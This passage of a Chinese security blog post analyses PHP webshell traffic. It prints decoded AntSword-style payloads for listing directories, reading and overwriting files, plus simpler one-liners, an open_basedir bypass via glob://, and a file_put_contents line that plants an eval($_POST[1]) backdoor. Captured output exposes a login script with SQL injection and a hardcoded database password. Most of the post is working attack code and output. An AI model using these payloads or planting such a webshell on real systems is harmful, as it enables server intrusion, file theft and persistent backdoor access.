+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-=:&#123;aaaj7/	<span class="number">2016</span><span class="number">-04</span><span class="number">-20</span> <span class="number">23</span>:<span class="number">36</span>:<span class="number">31</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">./	<span class="number">2016</span><span class="number">-05</span><span class="number">-12</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">42</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaaj5/	<span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">20</span>:<span class="number">19</span>:<span class="number">09</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaaj6/	<span class="number">2016</span><span class="number">-03</span><span class="number">-20</span> <span class="number">20</span>:<span class="number">50</span>:<span class="number">35</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">xss/	<span class="number">2016</span><span class="number">-02</span><span class="number">-11</span> <span class="number">12</span>:<span class="number">10</span>:<span class="number">56</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">nweb1/	<span class="number">2016</span><span class="number">-04</span><span class="number">-05</span> <span class="number">12</span>:<span class="number">40</span>:<span class="number">34</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaaj1/	<span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">15</span>:<span class="number">06</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">web_aaa/	<span class="number">2015</span><span class="number">-10</span><span class="number">-27</span> <span class="number">13</span>:<span class="number">18</span>:<span class="number">09</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaa_final/	<span class="number">2015</span><span class="number">-12</span><span class="number">-21</span> <span class="number">14</span>:<span class="number">25</span>:<span class="number">49</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaaj3/	<span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">20</span>:<span class="number">56</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaaj.bak/	<span class="number">2016</span><span class="number">-03</span><span class="number">-15</span> <span class="number">13</span>:<span class="number">47</span>:<span class="number">09</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">mbWebTraffic/	<span class="number">2015</span><span class="number">-10</span><span class="number">-10</span> <span class="number">23</span>:<span class="number">44</span>:<span class="number">46</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">web1/	<span class="number">2015</span><span class="number">-12</span><span class="number">-20</span> <span class="number">16</span>:<span class="number">04</span>:<span class="number">36</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">web2/	<span class="number">2015</span><span class="number">-11</span><span class="number">-05</span> <span class="number">22</span>:<span class="number">41</span>:<span class="number">19</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">web3/	<span class="number">2015</span><span class="number">-11</span><span class="number">-05</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">17</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaaj2/	<span class="number">2016</span><span class="number">-03</span><span class="number">-14</span> <span class="number">14</span>:<span class="number">25</span>:<span class="number">00</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">sctfq1/	<span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">15</span>:<span class="number">22</span>:<span class="number">00</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">CI/	<span class="number">2015</span><span class="number">-12</span><span class="number">-21</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">32</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">aaaj4/	<span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">28</span>:<span class="number">24</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">nweb/	<span class="number">2016</span><span class="number">-04</span><span class="number">-03</span> <span class="number">21</span>:<span class="number">01</span>:<span class="number">51</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">web50/	<span class="number">2015</span><span class="number">-12</span><span class="number">-01</span> <span class="number">15</span>:<span class="number">51</span>:<span class="number">02</span>	<span class="number">4096</span>	<span class="number">0775</span></span><br><span class="line">websocket/	<span class="number">2016</span><span class="number">-03</span><span class="number">-27</span> <span class="number">15</span>:<span class="number">19</span>:<span class="number">00</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">xsstmp/	<span class="number">2016</span><span class="number">-01</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">26</span>:<span class="number">40</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line">table/	<span class="number">2015</span><span class="number">-11</span><span class="number">-18</span> <span class="number">19</span>:<span class="number">31</span>:<span class="number">05</span>	<span class="number">4096</span>	<span class="number">0755</span></span><br><span class="line"><span class="number">9</span>d8cb6817c34555064ffc486e5a53d8e.jpg	<span class="number">2015</span><span class="number">-11</span><span class="number">-07</span> <span class="number">13</span>:<span class="number">29</span>:<span class="number">39</span>	<span class="number">114461</span>	<span class="number">0644</span></span><br><span class="line">&#125;:=-</span><br></pre></td></tr></table></figure>
+<p>看得出来做的很清晰</p>
+<p>里面还有个字段<code>$_POST[&quot;0xbad31815&quot;]=L2hvbWUvd3d3cm9vdC9kZWZhdWx0Lw==</code>，后面就是列的目录</p>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">40</span>ini_set(%<span class="number">22</span>display_errors%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">40</span>set_time_limit(<span class="number">0</span>)%<span class="number">3</span>B%<span class="number">40</span>set_magic_quotes_runtime(<span class="number">0</span>)%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>-%<span class="number">3</span>D%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>F%<span class="number">3</span>Dbase64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">220</span>xbad31815%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">24</span>P%<span class="number">3</span>D%<span class="number">40f</span>open(%<span class="number">24</span>F%<span class="number">2</span>C%<span class="number">22</span>r%<span class="number">22</span>)%<span class="number">3</span>Becho(%<span class="number">40f</span>read(%<span class="number">24</span>P%<span class="number">2</span>Cfilesize(%<span class="number">24</span>F)))%<span class="number">3</span>B%<span class="number">40f</span>close(%<span class="number">24</span>P)%<span class="number">3</span>B%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">3</span>D-%<span class="number">22</span>%<span class="number">3</span>Bdie()%<span class="number">3</span>B&#123;</span><br></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">echo <span class="string">"-=:&#123;"</span>;</span><br><span class="line">$F=base64_decode($_POST[<span class="string">"0xbad31815"</span>]);</span><br><span class="line">$P=@fopen($F,<span class="string">"r"</span>);</span><br><span class="line">echo(@fread($P,filesize($F)));</span><br><span class="line">@fclose($P);;</span><br><span class="line">echo <span class="string">"&#125;:=-"</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>
+<p>返回</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">-=:&#123;<span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	$user=trim($_POST[<span class="string">'user'</span>]);</span></span><br><span class="line"><span class="php">	$pass=md5(trim($_POST[<span class="string">'pass'</span>]));</span></span><br><span class="line"><span class="php">	$userid=$_COOKIE[<span class="string">'userid'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">	 $db = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>,<span class="string">'xx'</span>,<span class="string">'sGya3fFLx8zPXe'</span>,<span class="string">'xx1'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">	$query=<span class="string">"select password from users where username = '"</span>.$user.<span class="string">"' and password = '"</span>.$password.<span class="string">"'"</span>;</span></span><br><span class="line"><span class="php">	$result=$db-&gt;query($query);</span></span><br><span class="line"><span class="php">	$result_num=$result-&gt;num_rows;</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($result_num==<span class="number">0</span>)</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Something Error!')&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./welcome.php'&lt;/script&gt;"</span>;	</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">	<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		$row=$result-&gt;fetch_assoc();</span></span><br><span class="line"><span class="php">		$password=$row[<span class="string">'password'</span>];</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span>($pass=$password)</span></span><br><span class="line"><span class="php">		&#123;</span></span><br><span class="line"><span class="php">			$query = <span class="string">"update users set lastcookie = '"</span>.$userid.<span class="string">"' where username = '"</span>.$user.<span class="string">"'"</span>;</span></span><br><span class="line"><span class="php">			$result = $db-&gt;query($query);</span></span><br><span class="line"><span class="php">			header(<span class="string">"location:./user.php"</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		<span class="keyword">else</span></span></span><br><span class="line"><span class="php">		&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Something Error!')&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">                        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./welcome.php'&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">&#125;:=-</span><br></pre></td></tr></table></figure>
+<p>当然读的文件地址是<code>$_POST[&quot;0xbad31815&quot;] = L2hvbWUvd3d3cm9vdC9kZWZhdWx0L2hjdGZqMS9sb2dpbi5waHA=</code></p>
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">40</span>ini_set(%<span class="number">22</span>display_errors%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">40</span>set_time_limit(<span class="number">0</span>)%<span class="number">3</span>B%<span class="number">40</span>set_magic_quotes_runtime(<span class="number">0</span>)%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>-%<span class="number">3</span>D%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">40f</span>write(fopen(base64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">220</span>xbad31815%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">2</span>C%<span class="number">22</span>w%<span class="number">22</span>)%<span class="number">2</span>Cbase64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">220</span>xa7418ec4%<span class="number">22</span>%<span class="number">5</span>D))%<span class="number">3</span>F%<span class="number">221</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">220</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">3</span>D-%<span class="number">22</span>%<span class="number">3</span>Bdie()%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="meta">@ini_set(<span class="meta-string">"display_errors"</span>, <span class="meta-string">"0"</span>)</span>;</span><br><span class="line"><span class="meta">@set_time_limit(0)</span>;</span><br><span class="line"><span class="meta">@set_magic_quotes_runtime(0)</span>;</span><br><span class="line">echo <span class="string">"-=:&#123;"</span>;</span><br><span class="line">echo <span class="meta">@fwrite(fopen(base64_decode($_POST[<span class="meta-string">"0xbad31815"</span>])</span>,<span class="string">"w"</span>),base64_decode($_POST[<span class="string">"0xa7418ec4"</span>]))?<span class="string">"1"</span>:<span class="string">"0"</span>;;</span><br><span class="line">echo <span class="string">"&#125;:=-"</span>;</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+<p>写的文件地址还是<code>$_POST[&quot;0xbad31815&quot;] = L2hvbWUvd3d3cm9vdC9kZWZhdWx0L2hjdGZqMS9sb2dpbi5waHA=</code></p>
+<p>写的文件内容</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">"0xa7418ec4"</span>] = PD<span class="number">9</span>waHA<span class="symbol">NCgkkdXNlcj10</span>cmltKCRfUE<span class="number">9</span>TVFs<span class="symbol">ndXNlciddKTsNCgkkcGFzcz1</span>tZDUodHJpbSgkX<span class="number">1</span>BPU<span class="number">1</span>RbJ<span class="number">3</span>Bhc<span class="number">3</span>M<span class="symbol">nXSkpOw0</span>KCSR<span class="number">1</span>c<span class="number">2</span>VyaWQ<span class="number">9</span>JF<span class="number">9</span>DT<span class="number">09</span>LSUVbJ<span class="number">3</span>VzZXJpZCddOw<span class="number">0</span>KDQoJICRkYiA<span class="number">9</span>I<span class="name">G5</span>ldyBteX<span class="symbol">NxbGkoJ2</span>xvY<span class="number">2</span>Fsa<span class="name">G9</span>zdCcsJ<span class="number">3</span>dlYjExMScsJ<span class="number">3</span><span class="symbol">NHeWEzZkZMajV1</span>OHpQWGU<span class="symbol">nLCdoY3</span>Rmd<span class="number">2</span>ViMScpOw<span class="number">0</span>KDQoJJHF<span class="number">1</span>ZXJ<span class="number">5</span>PSJzZWxlY<span class="number">3</span>QgcGFzc<span class="number">3</span>d<span class="attr">vcmQgZnJvbSB1</span>c<span class="number">2</span>VycyB<span class="number">3</span>aGVyZSB<span class="number">1</span>c<span class="number">2</span>VybmFtZSA<span class="number">9</span>ICciLiR<span class="number">1</span>c<span class="number">2</span>VyLiI<span class="symbol">nIGFuZCBwYXNzd29</span>yZCA<span class="number">9</span>ICciLiRwYX<span class="symbol">Nzd29</span>yZC<span class="number">4</span>iJyI<span class="number">7</span>DQoJJHJlc<span class="number">3</span><span class="attr">VsdD0</span>kZGItP<span class="symbol">nF1</span>ZXJ<span class="number">5</span>KCRxdWVyeSk<span class="number">7</span>DQoJJHJlc<span class="number">3</span><span class="attr">VsdF9</span>udW<span class="number">09</span>JHJlc<span class="number">3</span><span class="attr">VsdC0</span>+b<span class="symbol">nVtX3</span>Jvd<span class="number">3</span><span class="name">M7</span>DQoJaWYoJHJlc<span class="number">3</span><span class="attr">VsdF9</span>udW<span class="number">09</span>PTApDQoJew<span class="number">0</span>KCQllY<span class="number">2</span>hvICI<span class="number">8</span>c<span class="number">2</span><span class="symbol">NyaXB0</span>PmFsZXJ<span class="number">0</span>KCdTb<span class="number">21</span>ldGhpbmcgRXJyb<span class="number">3</span>IhJyk<span class="number">8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>iOw<span class="number">0</span>KCQllY<span class="number">2</span>hvICI<span class="number">8</span>c<span class="number">2</span><span class="symbol">NyaXB0</span>P<span class="symbol">ndpbmRvdy5</span>sb<span class="number">2</span><span class="symbol">NhdGlvbi5</span>ocmVmPScuL<span class="number">3</span>dlbG<span class="symbol">NvbWUucGhwJzwvc2</span><span class="symbol">NyaXB0</span>PiI<span class="number">7</span>CQ<span class="number">0</span>KCX<span class="number">0</span><span class="symbol">NCg0</span>KCW<span class="attr">Vsc2</span>U<span class="symbol">NCgl7</span>DQoJCSRyb<span class="number">3</span>c<span class="number">9</span>JHJlc<span class="number">3</span><span class="attr">VsdC0</span>+ZmV<span class="number">0</span>Y<span class="number">2</span>hfYX<span class="symbol">Nzb2</span>MoKTs<span class="symbol">NCgkJJHBhc3</span><span class="symbol">N3</span>b<span class="number">3</span>JkPSRyb<span class="number">3</span>dbJ<span class="number">3</span>Bhc<span class="number">3</span><span class="symbol">N3</span>b<span class="number">3</span>JkJ<span class="number">107</span>DQoJCWlmKCRwYX<span class="symbol">NzPSRwYXNzd29</span>yZCk<span class="symbol">NCgkJew0</span>KCQkJJHF<span class="number">1</span>ZXJ<span class="number">5</span>ID<span class="number">0</span>gI<span class="symbol">nVwZGF0</span>ZSB<span class="number">1</span>c<span class="number">2</span>VycyBzZXQgbGFzdG<span class="symbol">Nvb2</span>tpZSA<span class="number">9</span>ICciLiR<span class="number">1</span>c<span class="number">2</span>VyaWQuIicgd<span class="number">2</span>hlcmUgdX<span class="symbol">Nlcm5</span>hbWUgPSA<span class="symbol">nIi4</span>kdX<span class="symbol">Nlci4</span>iJyI<span class="number">7</span>DQoJCQkkcmVzdWx<span class="number">0</span>ID<span class="number">0</span>gJGRiLT<span class="number">5</span>xdWVyeSgkcXVlc<span class="symbol">nkpOw0</span>KCQkJaGVhZGVyKCJsb<span class="number">2</span><span class="symbol">NhdGlvbjouL3</span>VzZXIucGhwIik<span class="number">7</span>DQoJCX<span class="number">0</span><span class="symbol">NCgkJZWxzZQ0</span>KCQl<span class="number">7</span>DQoJCQllY<span class="number">2</span>hvICI<span class="number">8</span>c<span class="number">2</span><span class="symbol">NyaXB0</span>PmFsZXJ<span class="number">0</span>KCdTb<span class="number">21</span>ldGhpbmcgRXJyb<span class="number">3</span>IhJyk<span class="number">8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>iOw<span class="number">0</span>KICAgICAgICAgICAgICAgICAgICAgICAgZW<span class="symbol">NobyAiPHNjcmlwdD53</span>aW<span class="number">5</span>kb<span class="number">3</span>cub<span class="name">G9</span>jYXRpb<span class="number">24</span>uaHJlZj<span class="number">0</span><span class="symbol">nLi93</span>ZWxjb<span class="number">21</span>lL<span class="symbol">nBocCc8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>iOw<span class="number">0</span>KCQl<span class="number">9</span>DQo<span class="symbol">NCgl9</span>DQoJDQo/P<span class="name">g0</span>K</span><br></pre></td></tr></table></figure>
+
+<h1 id="简单的方式"><a href="#简单的方式" class="headerlink" title="简单的方式"></a>简单的方式</h1><p>除了蚁剑的针对大型的服务器外，其实没必要那么复杂就可以获取我们想要的信息了</p>
+<h2 id="列目录-1"><a href="#列目录-1" class="headerlink" title="列目录"></a>列目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">echo</span> <span class="string">"&lt;br /&gt;"</span>;<span class="variable">$handler</span> = opendir(<span class="string">'./'</span>);<span class="keyword">while</span>( (<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span> ) &#123;<span class="built_in">echo</span> <span class="variable">$filename</span>.<span class="string">"&lt;br/&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>由于可能有open_basedir的问题，所以需要绕过<br><a href="http://drops.wooyun.org/tips/3978" target="_blank" rel="noopener">http://drops.wooyun.org/tips/3978</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));  </span></span><br><span class="line"><span class="php">$file_list = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php"><span class="comment">// normal files</span></span></span><br><span class="line"><span class="php">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///home/wwwroot/*"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;  </span></span><br><span class="line"><span class="php">    $file_list[] = $f-&gt;__toString();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// special files (starting with a dot(.))</span></span></span><br><span class="line"><span class="php">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///home/wwwroot/.*"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;  </span></span><br><span class="line"><span class="php">    $file_list[] = $f-&gt;__toString();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">sort($file_list);  </span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="读文件-1"><a href="#读文件-1" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span>=<span class="variable">$username</span>=file_get_contents(<span class="string">'./4ff692fb12aa996e27f0a108bfc386c2'</span>)<span class="comment">;var_dump($username);</span></span><br></pre></td></tr></table></figure>
+<h2 id="写文件-1"><a href="#写文件-1" class="headerlink" title="写文件"></a>写文件</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_put_contents(<span class="string">"/home/wwwroot/hackme/05d6a8025a7d0c0eee5f6d12a0a94cc9/shell.php"</span>,'&lt;?<span class="params">php</span> <span class="params">eval</span>($<span class="params">_POST</span>[1])</span>;?&gt;');</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://lorexxar.cn">LoRexxar</a>
+            <p>原文链接：<a href="https://lorexxar.cn/2016/05/12/php-shell/">https://lorexxar.cn/2016/05/12/php-shell/</a>
+            <p>发表日期：<a href="https://lorexxar.cn/2016/05/12/php-shell/">May 12th 2016, 8:04:02 pm</a>
+            <p>更新日期：<a href="https://lorexxar.cn/2016/05/12/php-shell/">May 12th 2016, 8:49:48 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2016/05/27/opcache-jcfx/" title= "在php opcache检测隐藏的后门程序">
+                    <div class="nextTitle">在php opcache检测隐藏的后门程序</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2016/05/10/asis-bcloud/" title= "Asis2016_Binary Cloud">
+                    <div class="prevTitle">Asis2016_Binary Cloud</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:lorexxar@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/LoRexxar" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <a href="/%E5%BC%BA%E8%A1%8C%E8%A2%AB%E6%8D%A2%E5%8F%B7%E7%9A%84LoRexxar" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/romor-rexxar" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看当前目录-amp-查看服务器信息"><span class="toc-number">1.</span> <span class="toc-text">查看当前目录&amp;查看服务器信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#列目录"><span class="toc-number">2.</span> <span class="toc-text">列目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件"><span class="toc-number">3.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件"><span class="toc-number">4.</span> <span class="toc-text">写文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的方式"><span class="toc-number"></span> <span class="toc-text">简单的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#列目录-1"><span class="toc-number">1.</span> <span class="toc-text">列目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件-1"><span class="toc-number">2.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件-1"><span class="toc-number">3.</span> <span class="toc-text">写文件</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
